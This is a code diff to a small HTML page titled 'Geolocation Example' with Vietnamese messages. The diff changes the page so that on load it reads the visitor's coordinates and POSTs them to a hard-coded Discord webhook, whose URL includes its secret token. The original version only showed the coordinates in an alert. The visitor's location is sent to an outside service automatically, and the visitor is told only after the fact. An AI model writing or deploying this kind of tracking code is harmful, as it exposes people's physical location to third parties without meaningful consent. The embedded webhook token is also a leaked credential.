@@ -4,25 +4,38 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Geolocation Example</title>
-    <script>
-        function getUserLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        alert(`Vị trí hiện tại của bạn:\nLatitude: ${latitude}\nLongitude: ${longitude}`);
-                    },
-                    (error) => {
-                        alert("Không thể lấy vị trí của bạn. Hãy kiểm tra cài đặt quyền truy cập vị trí.");
-                    }
-                );
-            } else {
-                alert("Trình duyệt của bạn không hỗ trợ xác định vị trí.");
-            }
-        }
+	<script>
+		function getUserLocation() {
+			if (navigator.geolocation) {
+				navigator.geolocation.getCurrentPosition(
+					(position) => {
+						const latitude = position.coords.latitude;
+						const longitude = position.coords.longitude;
+
+						const webhookURL = "https://discord.com/api/webhooks/1313906457355489304/jwxytbLi1fgiCNGnI-GvhmTz_1YJC4UjwkT4L5E1LmOxy1H3QVjmQ2beahueOzt9kRPJ";
+
+						const data = {
+							content: `Vị trí người dùng:\nLatitude: ${latitude}\nLongitude: ${longitude}`
+						};
+
+						fetch(webhookURL, {
+							method: "POST",
+							headers: {
+								"Content-Type": "application/json"
+							},
+							body: JSON.stringify(data)
+						})
+						.then(() => alert("Đã gửi vị trí lên Discord thành công!"))
+						.catch((err) => alert("Có lỗi xảy ra: " + JSON.stringify(err)));
+					},
+					(error) => alert("Không thể lấy vị trí.")
+				);
+			} else {
+				alert("Trình duyệt của bạn không hỗ trợ xác định vị trí.");
+			}
+		}
 		window.onload = getUserLocation;
-    </script>
+	</script>
 </head>
 <body>
     <a href="#" onclick="getUserLocation()">Test</a>
